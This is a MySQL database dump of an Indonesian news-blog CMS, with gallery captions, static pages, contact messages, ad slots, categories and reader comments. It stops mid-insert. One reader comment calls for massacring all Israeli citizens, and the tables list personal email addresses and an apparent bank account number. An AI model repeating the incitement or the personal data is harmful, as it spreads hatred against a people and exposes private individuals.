INSERT INTO `gallery` (`id_gallery`, `id_album`, `username`, `jdl_gallery`, `gallery_seo`, `keterangan`, `gbr_gallery`) VALUES
(238, 30, 'admin', 'Lautan Penonton', 'lautan-penonton', 'Lebih kurang dari 50.000 penonton yang memadati Stadion Gelora Bung Karno menyaksikan aksi Kantata Barock.\r\n', ''),
(237, 30, 'admin', 'Mengenang WS. Rendra', 'mengenang-ws-rendra', 'Konser didedikasikan buat salah satu anggota Kantata Takwa, WS. Rendra. Suasana kemeriahan para artis pendukung.\r\n', ''),
(240, 31, 'admin', 'Doa Bersamaaa', 'doa-bersamaaa', '<p>Mengingat agresi yang militer yang dilancarkan Israel merupakan pelanggaran hukum humaniter internasional. Menyusul banyak warga sipil yang telah menjadi korban akibat pertempuran yang dilakukan Israel dan Hamas. Sebelumnya, Sekretaris Jendral Perserikatan Bangsa - Bangsa (PBB) Ban Ki-moon dan Menteri Luar Negeri Amerika Serikat (AS) John Kerry melakukan pertemuan di Kairo, Mesir. Pertemuan di bertujuan untuk mendesak agar konflik yang terjadi di Gaza segera dihentikan.cbcvb</p>\r\n', ''),
(239, 30, 'admin', 'Semangat Kantata', 'semangat-kantata', 'Semangat para macan-macan tua Kantata, seolah mmemberi penyadaran baru dan bagai api yang tak pernah padam.\r\n', ''),
(236, 30, 'admin', 'Iwan Fals', 'iwan-fals', 'Iwan Fals yang tergabung dalam Kantata Barock bersama Setiawan Djodi dan Sawong Jabo menghibur penggemarnya di GBK.\r\n', ''),
(235, 30, 'admin', 'Iwan dan Oemar Bakrie', 'iwan-dan-oemar-bakrie', 'Aksi penonton yang mirip dengan Iwan Fals dan sang guru Oemar Bakrie\r\n', ''),
(234, 30, 'admin', 'Bento...Bento..!!', 'bentobento', 'Bento...Bento...Bentok...!! ....Asyikkk... begitu teriak Setiawan Djody dan Sawung Jabo yang ikuti ribuan penonton.\r\n', ''),
(232, 29, 'admin', 'Karpet Raksasa dari Bunga 008', 'karpet-raksasa-dari-bunga-008', 'sdasdasd', ''),
(233, 30, 'admin', 'Sujud Syukur', 'sujud-syukur', 'Seluruh awak Kantata Barock melakukan sujud syukur di penghujung acara.<br />\r\n', ''),
(231, 29, 'admin', 'Karpet Raksasa dari Bunga 007', 'karpet-raksasa-dari-bunga-007', '', ''),
(230, 29, 'admin', 'Karpet Raksasa dari Bunga 006', 'karpet-raksasa-dari-bunga-006', '', ''),
(229, 29, 'admin', 'Karpet Raksasa dari Bunga 005', 'karpet-raksasa-dari-bunga-005', '', ''),
(228, 29, 'admin', 'Karpet Raksasa dari Bunga 004', 'karpet-raksasa-dari-bunga-004', '', ''),
(227, 29, 'admin', 'Karpet Raksasa dari Bunga 003', 'karpet-raksasa-dari-bunga-003', '', ''),
(225, 29, 'admin', 'Karpet Raksasa dari Bunga 001', 'karpet-raksasa-dari-bunga-001', '', ''),
(226, 29, 'admin', 'Karpet Raksasa dari Bunga 002', 'karpet-raksasa-dari-bunga-002', '', ''),
(224, 28, 'admin', 'Favorit', 'favorit', 'Mainan adalah barang favorit yang senantiasa diburu para pembeli. Selain murah, pilihannya pun berbagai jenis.\r\n', ''),
(223, 28, 'admin', 'Suasana Pasar Asemka', 'suasana-pasar-asemka', 'Pasar Asemka, Jakarta, merupakan pasar grosir yang banyak menyediakan berbagai aksesoris seperti kalung, cincin, Souvenir pernakahan, dan lainnya. Di Pasara Asemka anda akan dimanjakan dengan beragam barang yang dibandrol dengan harga murah meriah dan biasanya dijual grosiran.<br />\r\n', ''),
(222, 28, 'admin', 'Petasan', 'petasan', 'Petasan aneka jenis juga dijajakan di Pasar Asemka, Jakarta.\r\n', ''),
(221, 28, 'admin', 'Merah Marun', 'merah-marun', 'Salah satu suvenir pernikahan nan cantik yang dijual di Pasar Asemka, Jakarta.\r\n', ''),
(220, 28, 'admin', 'Menata Cincin', 'menata-cincin', 'Seorang pedagang cincin aksesoris sedang merapihkan letak cincin agar lebih menarik di Pasar Asemka, Jakarta.\r\n', ''),
(219, 28, 'admin', 'Suvenir', 'suvenir', 'Aneka Souvenir Pernikahan yang dijual di Pasar Asemka, Jakarta.\r\n', ''),
(218, 28, 'admin', 'Seorang Wanita Pedagang', 'seorang-wanita-pedagang', 'Seorang wanita sedang menunggu kios aksesorisnya.\r\n', ''),
(217, 28, 'admin', 'Suasana Pasar', 'suasana-pasar', 'Suasana di Pasar Asemka yang senantiasa ramai. Dan pengunjung bebas memilih berbagai jenis aksesoris.\r\n', ''),
(216, 28, 'admin', 'Pedagang', 'pedagang', 'Seorang pedagang sedang membungkus souvenir penikahan yang akan dijual ataupun pesanan dari pelanggangnnya.\r\n', ''),
(254, 1, 'admin', 'Screenshot 1 ', 'screenshot-1-', 'Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 Screenshot 1 ', '');

-- --------------------------------------------------------

--
-- Struktur dari tabel `halamanstatis`
--

CREATE TABLE `halamanstatis` (
  `id_halaman` int(5) NOT NULL,
  `judul` varchar(100) NOT NULL,
  `judul_seo` varchar(100) NOT NULL,
  `isi_halaman` text NOT NULL,
  `tgl_posting` date NOT NULL,
  `gambar` varchar(100) NOT NULL,
  `username` varchar(50) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `dibaca` int(5) NOT NULL DEFAULT 1,
  `jam` time NOT NULL,
  `hari` varchar(20) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `halamanstatis`
--

INSERT INTO `halamanstatis` (`id_halaman`, `judul`, `judul_seo`, `isi_halaman`, `tgl_posting`, `gambar`, `username`, `dibaca`, `jam`, `hari`) VALUES
(46, 'Tentang Kami Mstore Blog', 'tentang-kami-mstore-blog', '<p>Mstore Blog merupakan portal online berita dan hiburan yang berfokus pada pembaca Indonesia baik yang berada di tanah air maupun yang tinggal di luar negeri. Berita&nbsp;<span style=\"font-size: 1rem;\">Mstore Blog</span><span style=\"font-size: 1rem;\">&nbsp;diupdate selama 24 jam dan mendapatkan kunjungan lebih dari 190 juta pageviews setiap bulannya (Sumber: Google Analytics).</span></p>\r\n<p><span style=\"font-size: 1rem;\">Mstore Blog</span>&nbsp;memiliki beragam konten dari berita umum, politik, peristiwa, internasional, ekonomi, lifestyle, selebriti, sports, bola, auto, teknologi, dan lainya. Mstore Blog&nbsp;juga merupakan salah satu portal pertama yang memberikan inovasi konten video dan mobile (handphone). Para pembaca kami adalah profesional, karyawan kantor, pengusaha, politisi, pelajar, dan ibu rumah tangga.</p>\r\n<p>Konten berita Mstore Blog&nbsp;ditulis secara tajam, singkat, padat, dan dinamis sebagai respons terhadap tuntutan masyarakat yang semakin efisien dalam membaca berita. Selain itu konsep portal berita online juga semakin menjadi pilihan masyarakat karena sifatnya yang up-to-date dan melaporkan kejadian peristiwa secara instant pada saat itu juga sehingga masyarakat tidak perlu menunggu sampai esok harinya untuk membaca berita yang terjadi.</p>\r\n<p><span style=\"font-size: 1rem;\">Mstore Blog</span>&nbsp;resmi diluncurkan (Commercial Launch) sebagai portal berita pada 06 Juli 2020) dan merupakan cikal-bakal bisnis online milik Multi Group, sebuah perusahan media terintegrasi yang terbesar di Indonesia dan di Asia Tenggara. Mstore Blog&nbsp;juga memiliki dan mengelola bisnis media TV (RCTI, MNC TV, Global TV), media cetak (Koran Seputar Indonesia, Tabloid Genie, Tabloid Mom &amp; Kiddie, majalah HighEnd, dan Trust), media radio (SINDO, Trijaya FM, ARH Global, Radio Dangdut Indonesia, V Radio), serta sejumlah bisnis media lainnya (mobile VAS, Manajemen artis, rumah produksi film, agen iklan, dll).</p>', '2014-04-07', '', 'admin', 77, '13:10:57', 'Senin'),
(48, 'Alamat Perusahaan', 'alamat-perusahaan', '<p>Mstore Blog merupakan portal online berita dan hiburan yang berfokus pada pembaca Indonesia baik yang berada di tanah air maupun yang tinggal di luar negeri. Berita&nbsp;<span style=\"font-size: 1rem;\">Mstore Blog</span><span style=\"font-size: 1rem;\">&nbsp;diupdate selama 24 jam dan mendapatkan kunjungan lebih dari 190 juta pageviews setiap bulannya (Sumber: Google Analytics).</span></p><p><span style=\"font-size: 1rem;\">Mstore Blog</span>&nbsp;memiliki beragam konten dari berita umum, politik, peristiwa, internasional, ekonomi, lifestyle, selebriti, sports, bola, auto, teknologi, dan lainya. Mstore Blog&nbsp;juga merupakan salah satu portal pertama yang memberikan inovasi konten video dan mobile (handphone). Para pembaca kami adalah profesional, karyawan kantor, pengusaha, politisi, pelajar, dan ibu rumah tangga.</p><p>Konten berita Mstore Blog&nbsp;ditulis secara tajam, singkat, padat, dan dinamis sebagai respons terhadap tuntutan masyarakat yang semakin efisien dalam membaca berita. Selain itu konsep portal berita online juga semakin menjadi pilihan masyarakat karena sifatnya yang up-to-date dan melaporkan kejadian peristiwa secara instant pada saat itu juga sehingga masyarakat tidak perlu menunggu sampai esok harinya untuk membaca berita yang terjadi.</p><p><span style=\"font-size: 1rem;\">Mstore Blog</span>&nbsp;resmi diluncurkan (Commercial Launch) sebagai portal berita pada 06 Juli 2020) dan merupakan cikal-bakal bisnis online milik Multi Group, sebuah perusahan media terintegrasi yang terbesar di Indonesia dan di Asia Tenggara. Mstore Blog&nbsp;juga memiliki dan mengelola bisnis media TV (RCTI, MNC TV, Global TV), media cetak (Koran Seputar Indonesia, Tabloid Genie, Tabloid Mom &amp; Kiddie, majalah HighEnd, dan Trust), media radio (SINDO, Trijaya FM, ARH Global, Radio Dangdut Indonesia, V Radio), serta sejumlah bisnis media lainnya (mobile VAS, Manajemen artis, rumah produksi film, agen iklan, dll).</p>\r\n', '2014-04-07', '', 'admin', 26, '13:32:28', 'Senin');

-- --------------------------------------------------------

--
-- Struktur dari tabel `header`
--

CREATE TABLE `header` (
  `id_header` int(5) NOT NULL,
  `judul` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `url` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_posting` date NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `header`
--

INSERT INTO `header` (`id_header`, `judul`, `url`, `gambar`, `tgl_posting`) VALUES
(31, 'Header3', '', 'header3.jpg', '2011-04-06'),
(32, 'Header2', '', 'header1.jpg', '2011-04-06'),
(33, 'Header1', '', 'header2.jpg', '2011-04-06');

-- --------------------------------------------------------

--
-- Struktur dari tabel `hubungi`
--

CREATE TABLE `hubungi` (
  `id_hubungi` int(5) NOT NULL,
  `nama` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `email` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `subjek` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `pesan` text COLLATE latin1_general_ci NOT NULL,
  `tanggal` date NOT NULL,
  `jam` time NOT NULL,
  `dibaca` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'N',
  `lampiran` varchar(255) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `hubungi`
--

INSERT INTO `hubungi` (`id_hubungi`, `nama`, `email`, `subjek`, `pesan`, `tanggal`, `jam`, `dibaca`, `lampiran`) VALUES
(39, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', '::1', 'Kami memiliki komitmen untuk memberikan layanan terbaik kepada Anda dan selalu berusaha untuk menyediakan produk dan layanan terbaik yang Anda butuhkan. Apabila untuk alasan tertentu Anda merasa tidak puas dengan pelayanan kami, Anda dapat menyampaikan kritik dan saran Anda kepada kami. Kami akan menidaklanjuti masukan yang Anda berikan dan bila perlu mengambil tindakan untuk mencegah masalah yang sama terulang kembali.', '2017-01-23', '21:56:12', 'Y', ''),
(35, 'yusri renor', 'aciafifah@gmail.com', 'pertanyaan', 'bagaimana cara mengunduh nomor ujian fak. pertanian', '2014-01-19', '00:00:00', 'Y', ''),
(36, 'Lusi Rahmawati', 'robby.prihandaya@gmail.com', 'xvgxcvxc', 'gbvibviubuibiub', '2014-07-02', '00:00:00', 'Y', ''),
(38, 'Udin Sedunia', 'udin.sedunia@gmail.com', 'Ip Pengirim : 120.177.28.244', 'Silahkan menghubungi kami melalui private message melalui form yang berada pada bagian kanan halaman ini. Kritik dan saran Anda sangat penting bagi kami untuk terus meningkatkan kualitas produk dan layanan yang kami berikan kepada Anda.', '2015-06-02', '00:00:00', 'Y', ''),
(40, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', '::1', 'Kami memiliki komitmen untuk memberikan layanan terbaik kepada Anda dan selalu berusaha untuk menyediakan produk dan layanan terbaik yang Anda butuhkan. Apabila untuk alasan tertentu Anda merasa tidak puas dengan pelayanan kami, Anda dapat menyampaikan kritik dan saran Anda kepada kami. Kami akan menidaklanjuti masukan yang Anda berikan dan bila perlu mengambil tindakan untuk mencegah masalah yang sama terulang kembali.', '2017-01-25', '09:54:45', 'Y', ''),
(41, 'Robby Prihandaya', 'todaynews.co.id@gmail.coms', '::1', 'asdasdasd', '2018-05-04', '19:33:01', 'Y', '');

-- --------------------------------------------------------

--
-- Struktur dari tabel `identitas`
--

CREATE TABLE `identitas` (
  `id_identitas` int(5) NOT NULL,
  `nama_website` varchar(100) NOT NULL,
  `email` varchar(100) NOT NULL,
  `url` varchar(100) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `facebook` text CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `rekening` varchar(100) NOT NULL,
  `no_telp` varchar(20) CHARACTER SET latin1 COLLATE latin1_general_ci NOT NULL,
  `meta_deskripsi` varchar(250) NOT NULL,
  `meta_keyword` varchar(250) NOT NULL,
  `favicon` varchar(50) NOT NULL,
  `maps` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `identitas`
--

INSERT INTO `identitas` (`id_identitas`, `nama_website`, `email`, `url`, `facebook`, `rekening`, `no_telp`, `meta_deskripsi`, `meta_keyword`, `favicon`, `maps`) VALUES
(1, 'Mstore Blog - Berita Terupdate Seputar Dunia', 'redaksi@mstore.co.id', 'https://blog.mstore.co.id/', 'https://www.facebook.com/mstoreindonesia, \r\nhttps://twitter.com/mstoreindonesia, \r\nhttps://www.instagram.com/mstoreindonesia, \r\nhttps://www.youtube.com/channel/SEGERA HADIR', '351188707183', '081267xxxxxx', 'Mstore Blog merupakan media online yang mempublikasikan serta memberikan informasi teraupdate dan akurat.', 'mstoreblog, portal, berita, media, online, beritahp, perbaikanhp, perbaikanlaptop', 'logo_mstore_kecil21.png', '\"https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15865.126406571027!2d106.801379!3d-6.226554!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0xdd90111874330a88!2sMstore!5e0!3m2!1sid!2sid!4v1594016113752!5m2!1sid!2sid\"');

-- --------------------------------------------------------

--
-- Struktur dari tabel `iklanatas`
--

CREATE TABLE `iklanatas` (
  `id_iklanatas` int(5) NOT NULL,
  `judul` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `url` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `source` text COLLATE latin1_general_ci NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_posting` date NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `iklantengah`
--

CREATE TABLE `iklantengah` (
  `id_iklantengah` int(5) NOT NULL,
  `judul` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `url` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `source` text COLLATE latin1_general_ci NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `tgl_posting` date NOT NULL,
  `posisi` varchar(50) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `iklantengah`
--

INSERT INTO `iklantengah` (`id_iklantengah`, `judul`, `username`, `url`, `source`, `gambar`, `tgl_posting`, `posisi`) VALUES
(1, 'Iklan Home No 1', 'mstore', 'https://mstore.co.id', '', 'home.jpg', '2020-08-06', 'home'),
(2, 'Iklan Home No 2', 'mstore', 'https://mstore.co.id', '', 'home.jpg', '2020-08-06', 'home'),
(3, 'Iklan Home No 3', 'mstore', 'https://mstore.co.id', '', 'home.jpg', '2020-08-06', 'home'),
(4, 'Iklan Detail Berita', 'mstore', 'https://mstore.co.id', '', 'home.jpg', '2020-08-06', 'berita_detail'),
(5, 'Iklan Detail Video', 'mstore', 'https://mstore.co.id', '', 'home.jpg', '2020-08-06', 'detail_video'),
(6, 'Iklan Detail Berita Foto', 'admin', 'https://mstore.co.id/', '', 'home.swf', '2020-07-06', 'berita_foto'),
(7, 'Iklan Halaman Download', 'admin', 'https://mstore.co.id/', '', 'home.jpg', '2020-07-06', 'hal_download'),
(8, 'Iklan detail agenda', 'admin', 'https://mstore.co.id/', '', 'home.jpg', '2020-07-06', 'detail_agenda'),
(9, 'Iklan halaman statis', 'admin', 'https://mstore.co.id/', '', '', '2020-07-06', 'hal_statis'),
(35, 'Iklan 2', 'admin', 'https://mstore.co.id/', '', 'iklan2.png', '2020-07-06', 'home_tengah'),
(36, 'Iklan 3', 'admin', 'https://mstore.co.id/', '', 'iklan3.png', '2020-07-06', 'home_tengah'),
(37, 'Iklan 4', 'admin', 'https://mstore.co.id/', '', 'iklan4.png', '2020-07-06', 'home_tengah'),
(38, 'iklan 5', 'admin', 'https://mstore.co.id/', '', 'iklan5.png', '2020-07-06', 'home_bawah'),
(39, 'iklan 6', 'admin', 'https://mstore.co.id/', '', 'iklan6.png', '2020-07-06', 'home_bawah'),
(40, 'iklan 7', 'admin', 'https://mstore.co.id/', '', 'iklan7.png', '2020-07-06', 'home_bawah');

-- --------------------------------------------------------

--
-- Struktur dari tabel `katajelek`
--

CREATE TABLE `katajelek` (
  `id_jelek` int(11) NOT NULL,
  `kata` varchar(60) COLLATE latin1_general_ci DEFAULT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `ganti` varchar(60) COLLATE latin1_general_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `katajelek`
--

INSERT INTO `katajelek` (`id_jelek`, `kata`, `username`, `ganti`) VALUES
(4, 'sex', '', 's**'),
(2, 'bajingan', '', 'b*******'),
(3, 'bangsat', '', 'b******'),
(5, 'fuck', 'admin', 'f**k'),
(6, 'pantat', 'admin', 'p****t');

-- --------------------------------------------------------

--
-- Struktur dari tabel `kategori`
--

CREATE TABLE `kategori` (
  `id_kategori` int(5) NOT NULL,
  `nama_kategori` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `username` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `kategori_seo` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y',
  `sidebar` int(10) NOT NULL,
  `gambar_utama` text COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `kategori`
--

INSERT INTO `kategori` (`id_kategori`, `nama_kategori`, `username`, `kategori_seo`, `aktif`, `sidebar`, `gambar_utama`) VALUES
(19, 'Gadget', 'admin', 'gadget', 'Y', 2, ''),
(2, 'E-Business', 'admin', 'ebusiness', 'Y', 4, ''),
(21, 'Ekonomi', '', 'ekonomi', 'Y', 7, ''),
(22, 'Politik', 'admin', 'politik', 'N', 9, ''),
(23, 'AppsOS', 'mstore', 'appsos', 'Y', 3, ''),
(31, 'Hardware', 'admin', 'hardware', 'Y', 5, ''),
(36, 'Komunitas', 'admin', 'komunitas', 'N', 12, ''),
(34, 'Seni & Budaya', '', 'seni--budaya', 'N', 0, ''),
(37, 'Sekitar Kita', '', 'sekitar-kita', 'N', 0, ''),
(39, 'Internet', 'admin', 'internet', 'Y', 1, 'XgATaL.jpg'),
(40, 'Kuliner', 'admin', 'kuliner', 'Y', 8, ''),
(41, 'Metropolitan', '', 'metropolitan', 'Y', 6, ''),
(42, 'Dunia Islam', 'admin', 'dunia-islam', 'N', 10, ''),
(44, 'Wisata', 'admin', 'wisata', 'N', 11, ''),
(46, 'Daerah', 'admin', 'daerah', 'N', 0, ''),
(47, 'Gaya Hidup', 'admin', 'gaya-hidup', 'Y', 13, ''),
(48, 'Hukum', '', 'hukum', 'Y', 0, ''),
(52, 'Sejarah Indonesia', 'admin', 'sejarah-indonesia', 'N', 0, ''),
(53, 'Tokoh', 'admin', 'tokoh', 'N', 0, ''),
(54, 'Tutorial', 'admin', 'tutorial', 'N', 0, '');

-- --------------------------------------------------------

--
-- Struktur dari tabel `komentar`
--

CREATE TABLE `komentar` (
  `id_komentar` int(5) NOT NULL,
  `id_berita` int(5) NOT NULL,
  `nama_komentar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `url` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `isi_komentar` text COLLATE latin1_general_ci NOT NULL,
  `tgl` date NOT NULL,
  `jam_komentar` time NOT NULL,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y',
  `email` varchar(100) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `komentar`
--

INSERT INTO `komentar` (`id_komentar`, `id_berita`, `nama_komentar`, `url`, `isi_komentar`, `tgl`, `jam_komentar`, `aktif`, `email`) VALUES
(84, 650, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'Nice  story, Roy suryo dan Susilo bambang yudhoyono memang cucak rowo. :)   ', '2012-01-05', '00:15:45', 'N', 'robby.prihandaya@gmail.com'),
(88, 650, 'Udin Sedunia', 'www.belajarkonseling.com', ' hm...  kae.x  perlu  juga  ne  bantuan  dari  para  konselor...:)		   ', '2012-01-13', '20:09:07', 'Y', 'www.belajarkonseling.com'),
(90, 650, 'Rizal Faizal', 'www.rizal-online.co.cc', ' asyik  aja  dehh...   ', '2012-02-25', '15:01:40', 'Y', 'www.rizal-online.co.cc'),
(91, 645, 'Eka Praja W', 'komputerkampus.com', ' makin  parah  aja  nih  ...\r\nmudah2n  bisa  berbenah  negeri  ku  yg  q  banggakan   ', '2012-03-08', '20:06:07', 'Y', 'komputerkampus.com'),
(137, 650, 'Lukmanul Hakim', '', ' saya  yakin  PHP  juga  bisa  bertahan  sampai  2030   ', '2013-01-19', '18:56:25', 'Y', 'lukmanul.haskim@gmai;.com'),
(146, 645, 'Tommy Utama', 'tommy.utama@gmail.com', ' Calon  hakim  agung  Muhammad  Daming  Sanusi  menyatakan,  hukuman  mati  tidak  layak  diberlakukan  bagi  pelaku  pemerkosaan.   ', '2014-07-21', '21:03:04', 'Y', 'tommy.utama@gmail.com'),
(147, 655, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'Mudah-mudahan  windows  8.2  tampilannya  lebih  keren  lagi  dari  windows  8.1 sebelumnya  yang  kurang  enak  di gunakan.  heheheee   ', '2014-07-22', '08:33:04', 'Y', 'robby.prihandaya@gmail.com'),
(144, 650, 'Tommy Utama', 'tommy.utama@gmail.com', 'Pengamat  politik  dari  Charta  Politika,  Yunarto  Wijaya  mempertanyakan  dasar  keputusan  SBY  menunjuk  Roy  Suryo  sebagai  Menpora.   ', '2014-07-21', '20:59:16', 'Y', 'tommy.utama@gmail.com'),
(143, 650, 'Udin Sedunia', 'udin.sedunia@gmail.com', 'Menurut  Yunarto,  Roy  selama  ini  lebih  dikenal  sebagai  pakar  foto  digital  dan  video  serta  dosen  di  sebuah  perguruan  tinggi  negeri.   ', '2014-07-21', '20:57:52', 'Y', 'udin.sedunia@gmail.com'),
(148, 662, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'pantat negara yahudi yang sangat perlu untuk dihancurkan /  musnahkan  dan  bantai  seluruh  warga israel..!!!   ', '2014-07-24', '09:29:20', 'Y', 'robby.prihandaya@gmail.com'),
(149, 662, 'Edo Ikfianda', 'edomuhammad90@gmail.com', 'Setelah membentuk Timnas, PSSI versi KLB pimpinan La Nyalla Mahmud Matalitti menunjuk Alfred Riedl sebagai pelatihnya.', '2014-08-09', '17:34:35', 'Y', 'edomuhammad90@gmail.com'),
(152, 650, 'Dewi Safitriir', 'dewi_safitri@gmail.com', 'Peremimpin  tertinggi  Iran,  Ayatollah  Ali  Khamenei  menyampaikan  pernyataan  kontroversial  terkait  ketegangan  di  Gaza.Israele.   ', '2014-08-17', '17:46:28', 'Y', 'dewi_safitri@gmail.com'),
(153, 662, 'Robby Prihandaya', 'ww.phpmu.com', 'Anda penyuka Transformer? Tentu hal yang paling menarik saat menonton film Transformer salah satunya adalah saat adegan transformasi yang begitu keren dari sebuah mobil atau truk menjadi robot yang gagah.\r\n\r\nAnda penyuka Transformer? Tentu hal yang paling menarik saat menonton film Transformer salah satunya adalah saat adegan transformasi yang begitu keren dari sebuah mobil atau truk menjadi robot yang gagah.', '2019-11-14', '06:10:12', 'Y', 'robby.prihandaya@gmail.com');

-- --------------------------------------------------------

--
-- Struktur dari tabel `komentarvid`
--

CREATE TABLE `komentarvid` (
  `id_komentar` int(5) NOT NULL,
  `id_video` int(5) NOT NULL,
  `nama_komentar` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `url` varchar(100) COLLATE latin1_general_ci NOT NULL,
  `isi_komentar` text COLLATE latin1_general_ci NOT NULL,
  `tgl` date NOT NULL,
  `jam_komentar` time NOT NULL,
  `aktif` enum('Y','N') COLLATE latin1_general_ci NOT NULL DEFAULT 'Y'
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `komentarvid`
--

INSERT INTO `komentarvid` (`id_komentar`, `id_video`, `nama_komentar`, `url`, `isi_komentar`, `tgl`, `jam_komentar`, `aktif`) VALUES
(107, 160, 'Prabowo Subianto', 'Prabowo@gmail.com', ' Your  email  address  will  not  be  published.  Required  fields  are  marked', '2014-07-21', '13:29:29', 'N'),
(108, 163, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', ' Kita  memang  harus  selamatkan  hutan  indonesia,  walau  apapun  yang  terjadi.   ', '2014-07-21', '13:31:10', 'Y'),
(109, 160, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', ' Swarakalibata  V.3 sekarang  hadir  dengan  tampilan  baru  yang  pastinya  sudah  jauh  lebih  maju  dari  versi  sebelumnya.', '2014-07-21', '21:09:31', 'Y'),
(112, 166, 'Robby Prihandaya', 'robby.prihandaya@gmail.com', 'Exclusive Di IDAFF Acedemy - &quot;Social Blogging Mastery 2&quot; - Workshop 2 Hari Yang Akan Merubah Hidup Anda Di Tahun 2017. Di Bongkar Oleh Ahlinya Cara Paling Mudah Memiliki Penghasillan Sampingan Lewat Internet Hingga Jutaan Rupiah Setiap Bulannya.', '2017-01-25', '09:40:01', 'Y'),
(113, 166, 'Dewiit Safitri', 'dewiit.safitri@gmail.com', 'Pemimpin tertinggi Iran, Ayatollah Ali Khamenei menyampaikan pernyataan kontroversial terkait ketegangan di Gaza. Khamenei mendorong agar Palestina terus melawan Israel. &quot;Salah satu cara untuk menghentikan rezim kurang ajar ini adalah melanjutkan perlawanan dan dan perjuangan bersenjata harus diperluas ke Tepi Barat,&quot; sebut Khamenei, seperti dikutip dari IRNA.', '2017-01-25', '09:40:55', 'Y');

-- --------------------------------------------------------

--
-- Struktur dari tabel `logo`
--

CREATE TABLE `logo` (
  `id_logo` int(5) NOT NULL,
  `gambar` varchar(100) COLLATE latin1_general_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

--
-- Dumping data untuk tabel `logo`
--

INSERT INTO `logo` (`id_logo`, `gambar`) VALUES
(15, 'logo_mstore_new_grey.png');

-- --------------------------------------------------------

--
-- Struktur dari tabel `menu`
--

CREATE TABLE `menu` (
  `id_menu` int(5) NOT NULL,
  `id_parent` int(5) NOT NULL DEFAULT 0,
  `nama_menu` varchar(255) NOT NULL,
  `link` varchar(100) NOT NULL,
  `aktif` enum('Ya','Tidak') NOT NULL DEFAULT 'Ya',
  `position` enum('Top','Bottom') DEFAULT 'Bottom',
  `urutan` int(3) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `menu`
--

INSERT INTO `menu` (`id_menu`, `id_parent`, `nama_menu`, `link`, `aktif`, `position`, `urutan`) VALUES
(115, 0, 'Info Iklan', '#', 'Ya', 'Top', 2),
(112, 149, 'Nasional', '#', 'Ya', 'Bottom', 9),
(13, 149, 'Internasional', 'kategori/detail/internasional', 'Ya', 'Bottom', 8),
(12, 149, 'Ekonomi', 'kategori/detail/ekonomi', 'Ya', 'Bottom', 10),
